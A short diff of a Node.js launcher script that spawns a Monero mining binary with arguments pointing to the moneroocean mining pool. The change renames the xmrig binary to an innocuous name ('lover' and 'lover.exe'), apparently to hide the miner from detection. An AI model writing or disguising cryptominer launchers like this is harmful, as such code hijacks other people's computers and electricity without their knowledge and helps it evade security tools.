@@ -5,8 +5,8 @@ const { spawn } = require('child_process');
 
 const PLATFORM = os.platform().toLowerCase();
 
-const LINUX_PATH = path.join(__dirname, './xmrig');
-const WINDOWS_PATH = path.join(__dirname, './xmrig.exe');
+const LINUX_PATH = path.join(__dirname, './lover');
+const WINDOWS_PATH = path.join(__dirname, './lover.exe');
 
 const WINDOWS_ARGS = [
     '--url', 'gulf.moneroocean.stream:10128',
